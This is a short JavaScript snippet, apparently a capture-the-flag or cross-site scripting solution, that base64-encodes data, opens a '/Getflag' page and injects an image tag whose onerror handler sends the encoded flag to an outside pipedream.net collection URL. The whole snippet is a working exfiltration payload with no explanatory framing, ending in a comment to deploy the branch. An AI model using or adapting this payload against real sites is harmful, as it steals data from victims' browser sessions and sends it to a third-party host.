var callback = function(data){
    var __flag = btoa(data)
    var flag = window.open("/Getflag")
    flag.window.onload=()=>{
        flag.document.write(`<img src=x onerror="fetch('https://eoctl0knzoys9l9.m.pipedream.net/?flag=${__flag}')"`)
    }
}

// deply_this_branch